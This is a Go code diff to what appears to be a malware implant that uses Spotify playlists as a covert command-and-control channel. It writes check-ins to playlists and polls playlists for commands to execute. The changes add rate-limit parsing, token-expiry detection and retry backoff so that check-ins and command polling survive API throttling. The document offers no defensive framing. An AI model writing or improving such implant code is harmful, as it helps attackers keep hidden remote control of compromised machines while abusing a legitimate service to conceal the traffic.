@@ -88,8 +88,17 @@ func (imp *Implant) sendCheckin() {
 
 	err = imp.client.WriteC2Playlists(ctx, chunks)
 	if err != nil {
-		fmt.Printf("[!] Checkin failed: %v\n", err)
-		fmt.Println("[*] Will retry checkin on next poll cycle")
+		wait := handleAPIError(err, "checkin")
+		if wait > 0 && wait < 300 {
+			fmt.Printf("[*] Waiting %s before retry...\n", formatDuration(wait))
+			time.Sleep(time.Duration(wait) * time.Second)
+			// One retry after wait
+			if err2 := imp.client.WriteC2Playlists(ctx, chunks); err2 == nil {
+				fmt.Printf("[*] Check-in sent (client_id=%s)\n", clientID)
+				imp.checkinPending = false
+				return
+			}
+		}
 		imp.checkinPending = true
 		return
 	}
@@ -104,6 +113,77 @@ func isRateLimit(err error) bool {
 	}
 	s := strings.ToLower(err.Error())
 	return strings.Contains(s, "rate") || strings.Contains(s, "429") || strings.Contains(s, "too many")
+}
+
+// isTokenExpired checks if the error is an expired/invalid token.
+func isTokenExpired(err error) bool {
+	if err == nil {
+		return false
+	}
+	s := strings.ToLower(err.Error())
+	return strings.Contains(s, "401") || strings.Contains(s, "expired") ||
+		strings.Contains(s, "unauthorized") || strings.Contains(s, "invalid access token")
+}
+
+// parseRetryAfter extracts seconds from Spotify rate limit error message.
+// Spotify errors contain "Retry will occur after: N s" or "Retry-After: N".
+func parseRetryAfter(err error) int {
+	if err == nil {
+		return 0
+	}
+	s := err.Error()
+
+	// Try "after: N s" pattern
+	if idx := strings.Index(s, "after:"); idx >= 0 {
+		rest := strings.TrimSpace(s[idx+6:])
+		rest = strings.TrimSuffix(rest, " s")
+		rest = strings.TrimSuffix(rest, "s")
+		rest = strings.Fields(rest)[0]
+		var n int
+		if _, err := fmt.Sscanf(rest, "%d", &n); err == nil {
+			return n
+		}
+	}
+	return 0
+}
+
+// formatDuration formats seconds into human-readable duration.
+func formatDuration(seconds int) string {
+	if seconds < 60 {
+		return fmt.Sprintf("%ds", seconds)
+	}
+	if seconds < 3600 {
+		return fmt.Sprintf("%dm%ds", seconds/60, seconds%60)
+	}
+	h := seconds / 3600
+	m := (seconds % 3600) / 60
+	return fmt.Sprintf("%dh%dm", h, m)
+}
+
+// handleAPIError logs a user-friendly message for Spotify API errors.
+// Returns the recommended wait time in seconds (0 = no wait).
+func handleAPIError(err error, context string) int {
+	if isRateLimit(err) {
+		retryAfter := parseRetryAfter(err)
+		if retryAfter > 600 {
+			fmt.Printf("[!] Spotify rate limit HARD BLOCK (%s): "+
+				"retry after %s\n"+
+				"    This happens when the API is hit too frequently.\n"+
+				"    Increase --interval or wait for the block to lift.\n",
+				context, formatDuration(retryAfter))
+		} else if retryAfter > 0 {
+			fmt.Printf("[!] Spotify rate limited (%s): "+
+				"retry after %s\n", context, formatDuration(retryAfter))
+		}
+		return retryAfter
+	}
+	if isTokenExpired(err) {
+		fmt.Printf("[!] Spotify token expired (%s): "+
+			"delete .cache-* and re-authenticate\n", context)
+		return 0
+	}
+	fmt.Printf("[!] Spotify API error (%s): %v\n", context, err)
+	return 0
 }
 
 // Run starts the main polling loop.
@@ -132,8 +212,11 @@ func (imp *Implant) pollAndExecute() {
 	seqGroups, err := imp.client.ReadC2Playlists(ctx,
 		protocol.ChannelCmd, imp.key, -1)
 	if err != nil {
-		if !isRateLimit(err) {
-			fmt.Printf("[!] Poll error: %v\n", err)
+		wait := handleAPIError(err, "poll")
+		if wait > 0 {
+			// Sleep for the rate limit period instead of normal interval
+			fmt.Printf("[*] Backing off for %s...\n", formatDuration(wait))
+			time.Sleep(time.Duration(wait) * time.Second)
 		}
 		return
 	}
